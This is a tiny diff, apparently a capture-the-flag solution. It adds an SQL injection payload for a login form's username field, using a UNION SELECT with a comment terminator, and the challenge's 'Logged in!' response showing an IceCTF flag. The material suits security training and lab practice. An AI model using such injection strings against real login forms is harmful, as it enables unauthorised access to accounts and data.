@@ -1,0 +1,3 @@
+username=xxxx'+union+select+1,1,1--+&password=
+
+<h1>Logged in!</h1><p>Your flag is: IceCTF{the_miners_union_is_a_strong_one}</p>
